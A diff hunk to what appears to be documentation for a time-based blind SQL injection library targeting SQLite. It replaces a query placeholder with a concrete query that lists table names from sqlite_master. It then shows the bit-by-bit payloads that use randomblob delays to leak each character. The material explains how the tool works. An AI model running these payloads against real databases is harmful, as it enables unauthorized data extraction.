@@ -158,12 +158,12 @@ For example:
 The library would yield conditions like this to the block, to be evaluated, and would measure timings, and return the data.
 
 ```
-unicode(substr(cast((#{query}) as blob), 1, 1))&1<>0 and randomblob(1000000)
-unicode(substr(cast((#{query}) as blob), 1, 1))&2<>0 and randomblob(1000000)
-unicode(substr(cast((#{query}) as blob), 1, 1))&4<>0 and randomblob(1000000)
+unicode(substr(cast((select group_concat(tbl_name,';') from sqlite_master where type='table') as blob), 1, 1))&1<>0 and randomblob(1000000)
+unicode(substr(cast((select group_concat(tbl_name,';') from sqlite_master where type='table') as blob), 1, 1))&2<>0 and randomblob(1000000)
+unicode(substr(cast((select group_concat(tbl_name,';') from sqlite_master where type='table') as blob), 1, 1))&4<>0 and randomblob(1000000)
 ...
-unicode(substr(cast((#{query}) as blob), 1, 1))&128<>0 and randomblob(1000000)
-unicode(substr(cast((#{query}) as blob), 2, 1))&1<>0 and randomblob(1000000)
+unicode(substr(cast((select group_concat(tbl_name,';') from sqlite_master where type='table') as blob), 1, 1))&128<>0 and randomblob(1000000)
+unicode(substr(cast((select group_concat(tbl_name,';') from sqlite_master where type='table') as blob), 2, 1))&1<>0 and randomblob(1000000)
 ...
 ```
 
